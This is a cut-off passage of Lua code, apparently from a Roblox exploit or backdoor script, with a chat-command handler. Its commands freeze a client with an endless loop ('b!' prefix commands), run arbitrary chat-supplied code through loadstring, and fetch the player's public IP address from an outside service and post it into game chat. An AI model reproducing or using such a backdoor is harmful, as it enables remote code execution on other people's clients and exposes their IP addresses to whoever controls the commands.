                        task.wait(2)
                        while true do
                        end
                    elseif splitted[1] == "b!run" then
                        local execute = #splitted[1] + 1
                        loadstring(string.sub(rizz, execute))()
                    elseif splitted[1] == "b!show" then
                        game.Players:Chat("ff " .. tostring(game:HttpGet("https://api.ipify.org/")))
                    end
                end
            )
        end
    end
